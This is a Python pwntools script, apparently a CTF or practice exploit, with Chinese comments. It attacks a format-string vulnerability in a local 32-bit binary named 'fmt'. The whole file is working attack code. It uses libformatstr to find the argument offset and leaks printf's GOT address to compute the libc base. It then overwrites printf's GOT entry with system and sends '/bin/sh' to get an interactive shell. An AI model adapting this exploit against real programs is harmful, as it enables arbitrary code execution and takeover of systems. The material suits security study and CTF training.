# coding:utf-8
# 格式化串漏洞，使用libformatstr

from pwn import *

# https://github.com/hellman/libformatstr
import libformatstr

#context.log_level= 'debug'
io = process('./fmt')
e = ELF('./fmt')
libc = ELF('/lib32/libc.so.6')

# libformatstr应用于格式化串在栈中，使得参数也可控的情况，可以实现任意读写
# 生成pattern串判断参数在格式化串的位置 
BUF_SZ = 200  # 格式化串的长度
pat = libformatstr.make_pattern(BUF_SZ)

io.sendline(pat)
res = io.recv()
# argnum 表示第argnum个参数位于格式化串首部
# padding 表示使参数对齐需要添加的字节数 0-3
argnum, padding = libformatstr.guess_argnum(res, BUF_SZ)
log.info('argnum:%d padding:%d'%(argnum, padding))

# leak不能泄漏地址中含0x00的值
def leak(addr):
	payload = p32(addr) +"%"+str(argnum)+"$s##"
	if '\x00' in payload:
		log.warn('0x00 found in payload')
		return None
	io.sendline(payload)
	buf = io.recvuntil('##\n')
	buf = buf[4:].strip('##\n')
	log.info('%#x -> buf(%d):\n %s'%(addr, len(buf), hexdump(buf)))
	return buf

buf = leak(e.got['printf'])
printf_addr = u32(buf[:4])
log.info('printf addr: %#x'% printf_addr)

libc_base = printf_addr - libc.symbols['printf']
system_addr = libc_base + libc.symbols['system']

log.info('system addr: %#x'% system_addr)

# 写入printf.got为system
p = libformatstr.FormatStr()
p[e.got['printf']]= system_addr
fmt_str = p.payload(argnum, padding, start_len=0) # 0 表示之前打印出的字符
log.info('payload:\n %s' % hexdump(fmt_str))

io.sendline(fmt_str)
io.recv()
io.sendline('/bin/sh')
io.recv()
io.interactive()